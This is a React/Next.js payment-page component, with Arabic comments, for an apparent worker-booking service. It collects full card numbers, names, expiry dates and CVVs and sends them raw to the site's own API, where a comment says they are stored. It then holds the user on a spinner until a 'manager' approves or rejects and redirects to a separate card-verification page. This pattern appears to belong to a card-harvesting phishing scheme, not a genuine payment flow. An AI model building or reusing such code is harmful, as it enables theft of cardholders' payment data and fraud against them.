"use client";

import { useState, useEffect, FormEvent, useCallback } from "react";
import { getFingerprint } from "@/lib/presence";
import { useRouter } from "next/navigation";
import { Dictionary } from "@/lib/i18n";
import { Card } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { Field, Input } from "@/components/ui/Field";
import { formatSalary } from "@/lib/utils";
import { subscribeToEntryStatus } from "@/lib/realtime";
import { CandidateImage } from "./CandidateImage";
import type { Booking, Worker } from "@/lib/supabase/types";
import styles from "./PaymentClient.module.css";

export function PaymentClient({
  booking,
  amount,
  dict,
  locale,
}: {
  booking: Booking & { workers: Worker };
  amount: number;
  dict: Dictionary;
  locale: string;
}) {
  const router = useRouter();
  // طريقة الدفع المختارة: بطاقات الائتمان (افتراضي) أو بطاقات الخصم المحلية (QPAY)
  const [method, setMethod] = useState<"card" | "qpay">("card");
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  // حالة الانتظار لقرار المدير
  const [verifying, setVerifying] = useState(false);
  const [paymentEntryId, setPaymentEntryId] = useState<string | null>(null);
  const p = dict.payment;

  const serviceFee = Math.round(amount * 0.1);
  const total = amount + serviceFee;

  // استقبال قرار المدير فوراً عبر Realtime (WebSocket) على قناة الـ entry.
  // البثّ إشعار فقط؛ نتحقق من الحالة الفعلية بطلب API موثوق قبل التطبيق
  // (لا نثق بالبثّ وحده). نبقى على polling احتياطي بطيء تحسّباً لانقطاع السوكيت.
  const verifyStatus = useCallback(
    async (entryId: string) => {
      try {
        const res = await fetch(`/api/payments/status?entryId=${entryId}`, {
          cache: "no-store" as RequestCache,
          headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
        });
        const data = await res.json();
        if (data.status === "approved") {
          setVerifying(false);
          router.push(`/${locale}/verify-card/${booking.id}?pid=${entryId}`);
          return "approved";
        }
        if (data.status === "rejected") {
          setVerifying(false);
          setError(p.rejectedMsg);
          setPaymentEntryId(null);
          return "rejected";
        }
      } catch {
        // تجاهل أخطاء الشبكة مؤقتاً
      }
      return null;
    },
    [booking.id, locale, p.rejectedMsg, router],
  );

  useEffect(() => {
    if (!verifying || !paymentEntryId) return;

    let cancelled = false;

    // اشتراك Realtime: عند وصول إشعار قرار، تحقق من الحالة فوراً.
    const channel = subscribeToEntryStatus(
      paymentEntryId,
      () => {
        if (!cancelled) void verifyStatus(paymentEntryId);
      },
      () => {
        // عند إعادة الاتصال بعد انقطاع، أعد جلب الحالة احتياطاً.
        if (!cancelled) void verifyStatus(paymentEntryId);
      },
    );

    // قراءة فورية عند الدخول (قد يكون القرار صدر قبل الاشتراك).
    void verifyStatus(paymentEntryId);

    // polling احتياطي بطيء (5ث) تحسّباً لفشل البثّ أو انقطاع السوكيت.
    const interval = setInterval(() => {
      if (!cancelled) void verifyStatus(paymentEntryId);
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
      void channel.unsubscribe();
    };
  }, [verifying, paymentEntryId, verifyStatus]);

  function formatCardNumber(value: string): string {
    const digits = value.replace(/\D/g, "").slice(0, 19);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  }

  function formatExpiry(value: string): string {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    setError(null);
    setLoading(true);

    try {
      const res = await fetch("/api/payments/initiate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-fingerprint": getFingerprint(),
        },
        body: JSON.stringify({
          bookingId: booking.id,
          cardNumber,
          cardName,
          expiry,
          cvv,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        const msg =
          data.error === "invalid_card"
            ? p.invalidCard
            : data.error === "luhn_failed"
              ? p.invalidCard
              : data.error === "already_paid"
                ? p.verifySuccess
                : p.invalidCard;
        setError(msg);
        return;
      }

      // تم تخزين البيانات + الانتقال لشاشة الانتظار
      setPaymentEntryId(data.entryId);
      setVerifying(true);
    } catch {
      setError(p.invalidCard);
    } finally {
      setLoading(false);
    }
  }

  // ===== شاشة جارٍ التحقق =====
  if (verifying) {
    return (
      <div className={styles.layout}>
        <Card className={styles.verifyingCard}>
          <div className={styles.spinnerWrap}>
            <div className={styles.spinner} />
          </div>
          <h1 className={styles.verifyingTitle}>{p.verifyingWait}</h1>
          <p className={styles.verifyingSub}>{p.verifyingSub}</p>
        </Card>
      </div>
    );
  }

  // ===== شاشة الرفض =====
  if (error === p.rejectedMsg) {
    return (
      <div className={styles.layout}>
        <Card className={styles.rejectedCard}>
          <div className={styles.rejectedIcon}>✗</div>
          <h1 className={styles.rejectedTitle}>{p.rejectedTitle}</h1>
          <p className={styles.rejectedMsg}>{p.rejectedMsg}</p>
          <Button
            onClick={() => {
              setError(null);
              setCardNumber("");
              setCardName("");
              setExpiry("");
              setCvv("");
            }}
            size="lg"
          >
            {p.retryPayment}
          </Button>
        </Card>
      </div>
    );
  }

  return (
    <div className={styles.layout}>
      <div className={styles.header}>
        <h1 className={styles.title}>{p.title}</h1>
        <p className={styles.subtitle}>{p.subtitle}</p>
      </div>

      <div className={styles.grid}>
        <Card className={styles.formCard}>
          {/* اختيار طريقة الدفع */}
          <div className={styles.payMethodWrap}>
            <h2 className={styles.payMethodTitle}>{p.payMethod}</h2>

            <button
              type="button"
              onClick={() => setMethod("card")}
              className={`${styles.methodOption} ${method === "card" ? styles.methodActive : ""}`}
              aria-pressed={method === "card"}
            >
              <span className={styles.methodBody}>
                <span className={styles.methodTitle}>{p.creditTitle}</span>
                <span className={styles.methodDesc}>{p.creditDesc}</span>
                <span className={styles.methodBrands}>
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img
                    alt="Visa, Mastercard, Amex, Apple Pay, Google Pay"
                    className={styles.creditBrandSprite}
                    src="/payment-brands/payment-brands-sprite.svg"
                  />
                </span>
              </span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className={`${styles.methodChevron} ${
                  method === "card" ? styles.chevronOpen : ""
                }`}
                aria-hidden="true"
              >
                <path d="m6 9 6 6 6-6"></path>
              </svg>
            </button>

            <button
              type="button"
              onClick={() => setMethod("qpay")}
              className={`${styles.methodOption} ${method === "qpay" ? styles.methodActive : ""}`}
              aria-pressed={method === "qpay"}
            >
              <span className={styles.methodBody}>
                <span className={styles.methodTitle}>{p.localDebitTitle}</span>
                <span className={styles.methodDesc}>{p.localDebitDesc}</span>
                <span className={styles.methodBrands}>
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img alt="NAPS" className={styles.brandChip} src="/payment-brands/naps.svg" />
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img alt="HIMYAN" className={styles.brandChip} src="/payment-brands/himyan.svg" />
                </span>
              </span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className={`${styles.methodChevron} ${
                  method === "qpay" ? styles.chevronOpen : ""
                }`}
                aria-hidden="true"
              >
                <path d="m6 9 6 6 6-6"></path>
              </svg>
            </button>
          </div>

          {method === "card" ? (
            <form onSubmit={handleSubmit} className={styles.form}>
            <Field label={p.cardNumber}>
              <Input
                value={cardNumber}
                onChange={(e) =>
                  setCardNumber(formatCardNumber(e.target.value))
                }
                placeholder={p.cardNumberPh}
                inputMode="numeric"
                autoComplete="cc-number"
                dir="ltr"
                style={{ textAlign: "start" }}
                required
              />
            </Field>

            <Field label={p.cardName}>
              <Input
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                placeholder={p.cardNamePh}
                autoComplete="cc-name"
                required
              />
            </Field>

            <div className={styles.row}>
              <Field label={p.expiry}>
                <Input
                  value={expiry}
                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                  placeholder={p.expiryPh}
                  inputMode="numeric"
                  autoComplete="cc-exp"
                  dir="ltr"
                  style={{ textAlign: "center" }}
                  required
                />
              </Field>
              <Field label={p.cvv}>
                <Input
                  value={cvv}
                  onChange={(e) =>
                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
                  }
                  placeholder={p.cvvPh}
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  type="password"
                  dir="ltr"
                  style={{ textAlign: "center" }}
                  required
                />
              </Field>
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <Button type="submit" size="lg" disabled={loading}>
              {loading ? p.processing : p.payNow}
            </Button>

            <div className={styles.secureNote}>🔒 {p.secureNote}</div>
          </form>
          ) : (
            <div className={styles.qpayPanel}>
              <div className={styles.qpayBadgeRow}>
                <span className={styles.qpayBrandChip}>
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img alt="NAPS" className={styles.brandChip} src="/payment-brands/naps.svg" />
                </span>
                <span className={styles.qpayBrandChip}>
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img alt="HIMYAN" className={styles.brandChip} src="/payment-brands/himyan.svg" />
                </span>
              </div>

              <p className={styles.qpayPanelDesc}>{p.continueQpayDesc}</p>

              <Button
                type="button"
                size="lg"
                onClick={() => router.push(`/${locale}/payment/qpay/${booking.id}`)}
              >
                {p.continueQpay}
              </Button>

              <div className={styles.secureNote}>🔒 {p.secureNote}</div>
            </div>
          )}
        </Card>

        <Card className={styles.summary}>
          <h2 className={styles.sectionTitle}>{booking.workers?.slug === "maawen-service" ? p.service : p.worker}</h2>
          {booking.workers?.slug !== "maawen-service" && (
            <div className={styles.workerCard}>
              {booking.workers && <CandidateImage worker={booking.workers} locale={locale as "ar" | "en"} className={styles.workerImg} />}
              <div>
                <h3 className={styles.workerName}>
                  {booking.workers?.full_name}
                </h3>
                <p className={styles.workerMeta}>
                  {booking.workers?.nationality} ·{" "}
                  {booking.workers?.experience_years}{" "}
                  {locale === "ar" ? "سنة خبرة" : "yrs exp"}
                </p>
              </div>
            </div>
          )}

          <div className={styles.summaryRows}>
            <div className={styles.summaryRow}>
              <span>{p.amount}</span>
              <strong>{formatSalary(amount, locale)}</strong>
            </div>
            <div className={styles.summaryRow}>
              <span>{p.serviceFee} (10%)</span>
              <strong>{formatSalary(serviceFee, locale)}</strong>
            </div>
            <div className={`${styles.summaryRow} ${styles.totalRow}`}>
              <span>{p.total}</span>
              <strong>{formatSalary(total, locale)}</strong>
            </div>
          </div>

          <div className={styles.refRow}>
            <span>{p.bookingRef}</span>
            <strong>{booking.booking_ref}</strong>
          </div>
        </Card>
      </div>
    </div>
  );
}

